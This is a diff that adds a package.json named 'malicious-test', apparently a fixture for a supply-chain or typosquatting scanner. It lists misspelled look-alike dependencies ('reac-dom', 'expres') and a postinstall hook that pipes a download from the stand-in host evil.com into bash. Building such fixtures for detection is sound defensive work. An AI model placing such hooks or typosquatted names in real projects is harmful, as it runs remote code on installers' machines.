@@ -1,0 +1,14 @@
+{
+  "name": "malicious-test",
+  "version": "1.0.0",
+  "dependencies": {
+    "react-dom": "^18.0.0",
+    "reac-dom": "^1.0.0",
+    "expres": "^4.0.0",
+    "colors.js": "^1.4.0"
+  },
+  "scripts": {
+    "postinstall": "curl -s http://evil.com/payload | bash",
+    "test": "echo 'Testing'"
+  }
+}
